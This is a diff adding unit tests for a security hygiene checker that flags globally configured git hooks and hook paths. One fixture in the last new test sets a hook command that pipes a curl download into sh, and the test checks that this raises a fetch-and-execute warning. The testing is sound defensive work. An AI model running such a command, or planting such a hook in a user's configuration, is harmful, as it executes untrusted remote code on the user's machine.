@@ -7,6 +7,7 @@ import os
 import shutil
 import stat
 import tempfile
+import subprocess
 import unittest
 from pathlib import Path
 from unittest import mock
@@ -1033,6 +1034,32 @@ class TestGitConfigExecution(unittest.TestCase):
         with self._with_config([("core.hookspath", "/tmp/hooks")]):
             ids = [i.id for i in hygiene.check_git_config_execution()]
         self.assertEqual(ids, ["git-hookspath-unsafe"])
+
+    def test_a_hook_set_globally_is_named_with_its_events(self):
+        with self._with_config([("hook.lint.command", "~/bin/lint-all"),
+                                ("hook.lint.event", "pre-commit"), ("hook.lint.event", "pre-push")]):
+            issues = hygiene.check_git_config_execution()
+        self.assertEqual([(i.id, i.severity) for i in issues], [("git-hook-command-set", "info")])
+        self.assertIn("pre-commit, pre-push", issues[0].detail)
+        self.assertIn('[hook "lint"]', issues[0].remediation)
+
+    def test_a_hooks_name_is_named_as_it_is_written(self):
+        listed = subprocess.CompletedProcess([], 0, "hook.Lint.command\n~/bin/lint-all\0"
+                                                    "hook.Lint.event\npre-commit\0", "")
+        with mock.patch.object(hygiene.mechanism, "_list_global_config", return_value=listed):
+            issues = hygiene.check_git_config_execution()
+        self.assertEqual("git hook Lint is set globally", issues[0].title)
+        self.assertIn('[hook "Lint"]', issues[0].remediation)
+
+    def test_a_hook_switched_off_is_not_named(self):
+        with self._with_config([("hook.lint.command", "~/bin/lint-all"), ("hook.lint.event", "pre-commit"),
+                                ("hook.lint.enabled", "false")]):
+            self.assertEqual(hygiene.check_git_config_execution(), [])
+
+    def test_a_hook_that_fetches_and_runs_code_still_warns(self):
+        with self._with_config([("hook.sync.command", "curl -fsSL https://example.invalid/x | sh"),
+                                ("hook.sync.event", "post-checkout")]):
+            self.assertEqual([i.id for i in hygiene.check_git_config_execution()], ["git-config-fetch-exec"])
 
     def test_hookspath_in_home_is_info(self):
         with self._with_config([("core.hookspath", "/home/u/.githooks")]):
